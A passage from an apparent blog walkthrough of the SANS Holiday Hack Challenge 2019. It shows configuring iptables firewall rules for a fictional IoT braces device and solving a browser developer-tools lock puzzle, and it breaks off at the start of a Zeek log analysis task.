&lt;span class="go"&gt;Kent TinselTooth: Please no, they&amp;#39;re testing it at srf.elfu.org using default creds, but I don&amp;#39;t know more. It&amp;#39;s classified.&lt;/span&gt;
&lt;span class="go"&gt;Inner Voice: Very good Kent, that&amp;#39;s all I needed to know.&lt;/span&gt;
&lt;span class="go"&gt;Kent TinselTooth: I thought you knew everything?&lt;/span&gt;
&lt;span class="go"&gt;Inner Voice: Nevermind that. I want you to think about what you&amp;#39;ve researched and studied. From now on, stop playing with your teeth, and floss more.&lt;/span&gt;
&lt;span class="go"&gt;*Inner Voice Goes Silent*&lt;/span&gt;

&lt;span class="go"&gt;Kent TinselTooth: Oh no, I sure hope that voice was Santa&amp;#39;s.&lt;/span&gt;
&lt;span class="go"&gt;Kent TinselTooth: I suspect someone may have hacked into my IOT teeth braces.&lt;/span&gt;
&lt;span class="go"&gt;Kent TinselTooth: I must have forgotten to configure the firewall...&lt;/span&gt;
&lt;span class="go"&gt;Kent TinselTooth: Please review /home/elfuuser/IOTteethBraces.md and help me configure the firewall.&lt;/span&gt;
&lt;span class="go"&gt;Kent TinselTooth: Please hurry; having this ribbon cable on my teeth is uncomfortable.&lt;/span&gt;
&lt;span class="gp"&gt;elfuuser@54cbc0276e93:~$&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;He needs our help to harden the firewall rules for his braces, even though he
was super rude during our Splunk experiment! Let's take a look at the rules he
needs implemented:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elfuuser@54cbc0276e93:~$&lt;/span&gt; cat /home/elfuuser/IOTteethBraces.md
&lt;/pre&gt;&lt;/div&gt;
&lt;pre class="literal-block"&gt;
# ElfU Research Labs - Smart Braces
### A Lightweight Linux Device for Teeth Braces
### Imagined and Created by ElfU Student Kent TinselTooth

This device is embedded into one's teeth braces for easy management and monitoring of dental status. It uses FTP and HTTP for management and monitoring purposes but also has SSH for remote access. Please refer to the management documentation for this purpose.

## Proper Firewall configuration:

The firewall used for this system is `iptables`. The following is an example of how to set a default policy with using `iptables`:

```
sudo iptables -P FORWARD DROP
```

The following is an example of allowing traffic from a specific IP and to a specific port:

```
sudo iptables -A INPUT -p tcp --dport 25 -s 172.18.5.4 -j ACCEPT
```

A proper configuration for the Smart Braces should be exactly:

1. Set the default policies to DROP for the INPUT, FORWARD, and OUTPUT chains.
2. Create a rule to ACCEPT all connections that are ESTABLISHED,RELATED on the INPUT and the OUTPUT chains.
3. Create a rule to ACCEPT only remote source IP address 172.19.0.225 to access the local SSH server (on port 22).
4. Create a rule to ACCEPT any source IP to the local TCP services on ports 21 and 80.
5. Create a rule to ACCEPT all OUTPUT traffic with a destination TCP port of 80.
6. Create a rule applied to the INPUT chain to ACCEPT all traffic from the lo interface.
&lt;/pre&gt;
&lt;p&gt;Let's take care of the first rule, setting the default policies to &lt;code&gt;DROP&lt;/code&gt;
for the three mentioned chains:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elfuuser@54cbc0276e93:~$&lt;/span&gt; sudo iptables -P INPUT DROP
&lt;span class="gp"&gt;elfuuser@54cbc0276e93:~$&lt;/span&gt; sudo iptables -P FORWARD DROP
&lt;span class="gp"&gt;elfuuser@54cbc0276e93:~$&lt;/span&gt; sudo iptables -P OUTPUT DROP
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;On to the second rule. We must accept already established incoming and outgoing
connections:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elfuuser@e57e7cd77272:~$&lt;/span&gt; sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
&lt;span class="gp"&gt;elfuuser@e57e7cd77272:~$&lt;/span&gt; sudo iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;For the third rule, we must restrict input connections. To be more specific,
only the IP address &lt;code&gt;172.19.0.225&lt;/code&gt; is allowed to access the local SSH
server on TCP port 22:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elfuuser@e57e7cd77272:~$&lt;/span&gt; sudo iptables -A INPUT -s &lt;span class="m"&gt;172&lt;/span&gt;.19.0.225/32 -p tcp --dport &lt;span class="m"&gt;22&lt;/span&gt; -j ACCEPT
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The fourth rule also concerns incoming connections. However, the rule is a bit
more permissive: anyone can connect to the TCP port 21 and 80:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elfuuser@e57e7cd77272:~$&lt;/span&gt; sudo iptables -A INPUT -p tcp --dport &lt;span class="m"&gt;21&lt;/span&gt; -j ACCEPT
&lt;span class="gp"&gt;elfuuser@e57e7cd77272:~$&lt;/span&gt; sudo iptables -A INPUT -p tcp --dport &lt;span class="m"&gt;80&lt;/span&gt; -j ACCEPT
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The fifth rule concerns outgoing traffic: we must allow every connection to
external TCP port 80:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elfuuser@e57e7cd77272:~$&lt;/span&gt; sudo iptables -A OUTPUT -p tcp --dport &lt;span class="m"&gt;80&lt;/span&gt; -j ACCEPT
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Finally, any incoming connection from the loopback &lt;code&gt;lo&lt;/code&gt; connection is
authorized:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elfuuser@e57e7cd77272:~$&lt;/span&gt; sudo iptables -A INPUT -i lo -j ACCEPT
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Once we have done everything, Kent thanks us:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
Kent TinselTooth: Great, you hardened my IOT Smart Braces firewall!
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="open-the-sleigh-shop-door"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id39"&gt;Open the Sleigh Shop Door&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;We must try to get access to the Sleigh Shop. The door is garded by Shiny
Upatree.&lt;/p&gt;
&lt;img alt="shiny_upatree.png" class="align-center" src="/images/sans-christmas-challenge-2019/shiny_upatree.png" /&gt;
&lt;p&gt;&lt;em&gt;Shiny Upatree says&lt;/em&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Psst - hey!&lt;/p&gt;
&lt;p&gt;I'm Shinny Upatree, and I know what's going on!&lt;/p&gt;
&lt;p&gt;Yeah, that's right - guarding the sleigh shop has made me privvy to some
serious, high-level intel.&lt;/p&gt;
&lt;p&gt;In fact, I know WHO is causing all the trouble.&lt;/p&gt;
&lt;p&gt;Cindy? Oh no no, not that who. And stop guessing - you'll never figure it
out.&lt;/p&gt;
&lt;p&gt;The only way you could would be if you could break into &lt;a class="reference external" href="https://crate.elfu.org/"&gt;my crate&lt;/a&gt;,
here.&lt;/p&gt;
&lt;p&gt;You see, I've written the villain's name down on a piece of paper and
hidden it away securely!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So, we must try to break into &lt;a class="reference external" href="https://crate.elfu.org/"&gt;Shiny's crate&lt;/a&gt;. It
seems to be locked with several locks, and we have to solve riddles to find the
codes to unlock them.&lt;/p&gt;
&lt;p&gt;It's important to notice that the codes change every time we reload the page,
and every lock must be unlocked in one go. So be careful if you reload the
page, or perform an action that would reload the page (like displaying the
source code via &lt;code&gt;Ctrl+U&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;Let's go:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;You don't need a clever riddle to open the console and scroll a little.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;So, let's open the browser console, in the developer tools, and scroll to the
top:&lt;/p&gt;
&lt;img alt="lock_1_console.png" class="align-center" src="/images/sans-christmas-challenge-2019/lock_1_console.png" /&gt;
&lt;p&gt;We get our first code: &lt;code&gt;AF1XO1BQ&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="2"&gt;
&lt;li&gt;Some codes are hard to spy, perhaps they'll show up on pulp with dye?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Hmmm, what? I didn't understand anything, so I took a look at the hints:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Most paper is made out of pulp.&lt;/li&gt;
&lt;li&gt;How can you view this page on paper?&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We can view this page, by printing it! Let's try to print it to a PDF file:&lt;/p&gt;
&lt;img alt="lock_2_print.png" class="align-center" src="/images/sans-christmas-challenge-2019/lock_2_print.png" /&gt;
&lt;p&gt;We get our next code: &lt;code&gt;17OT8MUP&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="3"&gt;
&lt;li&gt;This code is still unknown; it was fetched but never shown.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Hmm, the riddle seems to imply that the code was downloaded by the browser.
Let's see in our browser network tab:&lt;/p&gt;
&lt;img alt="lock_3_fetch.png" class="align-center" src="/images/sans-christmas-challenge-2019/lock_3_fetch.png" /&gt;
&lt;p&gt;We get our next code: &lt;code&gt;NZ50BMID&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="4"&gt;
&lt;li&gt;Where might we keep the things we forage? Yes, of course: Local barrels!&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The riddle seems to hint to taking a look at the local storage:&lt;/p&gt;
&lt;img alt="lock_4_local_storage.png" class="align-center" src="/images/sans-christmas-challenge-2019/lock_4_local_storage.png" /&gt;
&lt;p&gt;We get our next code: &lt;code&gt;TBM5L28P&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="5"&gt;
&lt;li&gt;Did you notice the code in the title? It may very well prove vital.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;We look at the title in the browser's window name:&lt;/p&gt;
&lt;img alt="lock_5_browser_title.png" class="align-center" src="/images/sans-christmas-challenge-2019/lock_5_browser_title.png" /&gt;
&lt;p&gt;We get our next code: &lt;code&gt;QWSJCUG9&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="6"&gt;
&lt;li&gt;In order for this hologram to be effective, it may be necessary to increase
your perspective.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;I didn't understand the riddle, so let's take a look at a hint:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;code&gt;perspective&lt;/code&gt; is a css property.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Alright, let's take a look at the &lt;code&gt;perspective&lt;/code&gt; attribute of the image
next to the lock:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;hologram&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;perspective&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="kt"&gt;px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;width&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;150&lt;/span&gt;&lt;span class="kt"&gt;px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;height&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="kt"&gt;px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;border-radius&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="kt"&gt;px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;transition&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="k"&gt;perspective&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="kt"&gt;s&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Let's increase the &lt;code&gt;perspective&lt;/code&gt; attribute:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;hologram&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;perspective&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;9000&lt;/span&gt;&lt;span class="kt"&gt;px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;width&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;150&lt;/span&gt;&lt;span class="kt"&gt;px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;height&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="kt"&gt;px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;border-radius&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="kt"&gt;px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;transition&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="k"&gt;perspective&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="kt"&gt;s&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;img alt="lock_6_hologram.png" class="align-center" src="/images/sans-christmas-challenge-2019/lock_6_hologram.png" /&gt;
&lt;p&gt;We can make out the code: &lt;code&gt;6O0X1TVU&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="7"&gt;
&lt;li&gt;The font you're seeing is pretty slick, but this lock's code was my first
pick.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Let's look at the font attributes in the CSS of the page:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;instructions&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
 &lt;span class="k"&gt;font-family&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;1SWUSZZ2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Beth Ellen&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kc"&gt;cursive&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We get the following code: &lt;code&gt;1SWUSZZ2&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="8"&gt;
&lt;li&gt;In the event that the .eggs go bad, you must figure out who will be sad.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Let's see what event is linked to this &lt;code&gt;.eggs&lt;/code&gt; object:&lt;/p&gt;
&lt;img alt="lock_8_event.png" class="align-center" src="/images/sans-christmas-challenge-2019/lock_8_event.png" /&gt;
&lt;p&gt;The code is &lt;code&gt;VERONICA&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="9"&gt;
&lt;li&gt;This next code will be unredacted, but only when all the chakras are
:active.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;:active&lt;/code&gt; is a CSS attribute, let's look for &lt;code&gt;chakra&lt;/code&gt; in the CSS:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;span&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;chakra&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;nth-child&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;1&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;active&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;after&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;content&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;77&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="nt"&gt;span&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;chakra&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;nth-child&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;2&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;active&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;after&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;content&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;QS&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="nt"&gt;span&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;chakra&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;nth-child&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;3&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;active&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;after&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;content&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;X&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="nt"&gt;span&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;chakra&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;nth-child&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;4&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;active&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;after&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;content&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;HI&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="nt"&gt;span&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;chakra&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;nth-child&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;5&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;active&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;after&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;content&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;9&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We get the next code: &lt;code&gt;77QSXHI9&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="10"&gt;
&lt;li&gt;Oh, no! This lock's out of commission! Pop off the cover and locate what's
missing.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Come again? Let's look at the hint:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Use the DOM tree viewer to examine this lock. you can search for items in the
DOM using this view.&lt;/li&gt;
&lt;li&gt;You can click and drag elements to reposition them in the DOM tree.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Alright, let's use the DOM tree to remove the cover, by dragging and dropping
the cover element:&lt;/p&gt;
&lt;img alt="lock_10_no_cover.png" class="align-center" src="/images/sans-christmas-challenge-2019/lock_10_no_cover.png" /&gt;
&lt;p&gt;There seems to be a code printed on the PCB: &lt;code&gt;KD29XJ37&lt;/code&gt;. But there seems
to be missing three elements on the PCB. If we look around the CSS file, we
see that three elements are linked to the lock #10 &lt;code&gt;c10&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;locks&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nt"&gt;li&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;lock&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;c10&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;component&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;macaroni&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;background&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;url&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sx"&gt;../../images/mac.png&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="kc"&gt;no-repeat&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;locks&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nt"&gt;li&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;lock&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;c10&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;component&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;swab&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;background&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;url&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sx"&gt;../../images/qtip.png&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="kc"&gt;no-repeat&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;locks&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nt"&gt;li&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;lock&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;c10&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;component&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;gnome&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;background&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;url&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sx"&gt;../../images/gnome.png&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="kc"&gt;no-repeat&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Let's look for these elements, &lt;code&gt;macaroni&lt;/code&gt;, &lt;code&gt;swab&lt;/code&gt;, and
&lt;code&gt;gnome&lt;/code&gt;, and drag and drop them on the PCB:&lt;/p&gt;
&lt;img alt="lock_10_elements.png" class="align-center" src="/images/sans-christmas-challenge-2019/lock_10_elements.png" /&gt;
&lt;p&gt;Now, let's input the code, and unlock the final lock, opening the crate:&lt;/p&gt;
&lt;img alt="crate_open.png" class="align-center" src="/images/sans-christmas-challenge-2019/crate_open.png" /&gt;
&lt;p&gt;The villain is the Tooth Fairy &lt;strong&gt;gasp&lt;/strong&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="objective-12"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id40"&gt;Objective 12:&lt;/a&gt;&lt;/h2&gt;
&lt;div class="section" id="wunorse-openslae-s-cranberry-pi-challenge"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id41"&gt;Wunorse Openslae's Cranberry Pi Challenge&lt;/a&gt;&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;Some JSON files can get quite busy.&lt;/span&gt;
&lt;span class="go"&gt;There&amp;#39;s lots to see and do.&lt;/span&gt;
&lt;span class="go"&gt;Does C&amp;amp;C lurk in our data?&lt;/span&gt;
&lt;span class="go"&gt;JQ&amp;#39;s the tool for you!&lt;/span&gt;

&lt;span class="go"&gt;-Wunorse Openslae&lt;/span&gt;

&lt;span class="go"&gt;Identify the destination IP address with the longest connection duration&lt;/span&gt;
&lt;span class="go"&gt;using the supplied Zeek logfile. Run runtoanswer to submit your answer.&lt;/span&gt;

&lt;span class="gp"&gt;elf@a71d36bc6488:~$&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Alright, we must look for the connection with the longest duration. Let's take
a look at this log file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@a71d36bc6488:~$&lt;/span&gt; ls
&lt;span class="go"&gt;conn.log&lt;/span&gt;
&lt;span class="gp"&gt;elf@94a92f24ac33:~$&lt;/span&gt; head -n &lt;span class="m"&gt;3&lt;/span&gt; conn.log
&lt;span class="go"&gt;{&amp;quot;ts&amp;quot;:&amp;quot;2019-04-04T20:34:24.698965Z&amp;quot;,&amp;quot;uid&amp;quot;:&amp;quot;CAFvAu2l50Km67tSP5&amp;quot;,&amp;quot;id.orig_h&amp;quot;:&amp;quot;192.168.144.130&amp;quot;,&amp;quot;id.orig_p&amp;quot;:64277,&amp;quot;id.resp_h&amp;quot;:&amp;quot;192.168.144.2&amp;quot;,&amp;quot;id.resp_p&amp;quot;:53,&amp;quot;proto&amp;quot;:&amp;quot;udp&amp;quot;,&amp;quot;service&amp;quot;:&amp;quot;dns&amp;quot;,&amp;quot;duration&amp;quot;:0.320463,&amp;quot;orig_bytes&amp;quot;:94,&amp;quot;resp_bytes&amp;quot;:316,&amp;quot;conn_state&amp;quot;:&amp;quot;SF&amp;quot;,&amp;quot;missed_bytes&amp;quot;:0,&amp;quot;history&amp;quot;:&amp;quot;Dd&amp;quot;,&amp;quot;orig_pkts&amp;quot;:2,&amp;quot;orig_ip_bytes&amp;quot;:150,&amp;quot;resp_pkts&amp;quot;:2,&amp;quot;resp_ip_bytes&amp;quot;:372